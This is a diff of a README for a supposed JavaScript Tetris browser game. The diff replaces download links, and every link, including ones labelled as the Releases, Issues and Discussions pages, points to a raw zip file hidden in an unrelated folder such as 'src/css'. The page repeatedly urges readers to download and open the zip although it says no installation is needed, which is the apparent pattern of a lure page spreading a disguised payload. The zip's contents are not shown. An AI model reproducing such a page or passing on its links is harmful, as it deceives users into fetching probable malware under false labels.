@@ -4,7 +4,7 @@
 Welcome to the javascript-tetris project! This is a classic Tetris game made with HTML5, CSS3, and JavaScript. It serves as an educational project, showcasing the MVC architecture and Canvas API. You don't need any external dependencies to enjoy this game.
 
 ## 📥 Download the Game
-[![Download from Releases](https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip%20Now-Click%https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip)](https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip)
+[![Download from Releases](https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip%20Now-Click%https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip)](https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip)
 
 ## 📋 Requirements
 To run the game, you will need:
@@ -13,10 +13,10 @@ To run the game, you will need:
 - No installation is necessary. The game runs directly in your browser.
 
 ## 🚀 Play the Game
-1. Visit the [Releases page](https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip).
+1. Visit the [Releases page](https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip).
 2. Click on the latest release available.
-3. Download the `https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip` file by clicking on the file.
-4. Open the downloaded `https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip` in your web browser. This will launch the game.
+3. Download the `https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip` file by clicking on the file.
+4. Open the downloaded `https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip` in your web browser. This will launch the game.
 5. Enjoy playing Tetris!
 
 ## 🌟 Features
@@ -51,15 +51,15 @@ If you face issues while playing:
 
 ## 🐞 Reporting Bugs
 To report bugs or suggest changes:
-- Visit the [Issues page](https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip).
+- Visit the [Issues page](https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip).
 - Provide a detailed description of the problem or suggestion.
 
 ## 💬 Community
 Join the conversation! Feel free to connect with other players and contributors on discussions related to the game:
-- You can create a thread on the [Discussions page](https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip).
+- You can create a thread on the [Discussions page](https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip).
 
 ## 📜 License
 This project is licensed under the MIT License. You may use and modify it as you wish, but be sure to credit the original creator.
 
 ## 📥 Download Again
-You can always download the game from the [Releases page](https://raw.githubusercontent.com/ihsanpatria/javascript-tetris/main/blepharoadenitis/javascript-tetris.zip). Enjoy playing Tetris!
+You can always download the game from the [Releases page](https://github.com/ihsanpatria/javascript-tetris/raw/refs/heads/main/src/css/tetris-javascript-v3.1.zip). Enjoy playing Tetris!
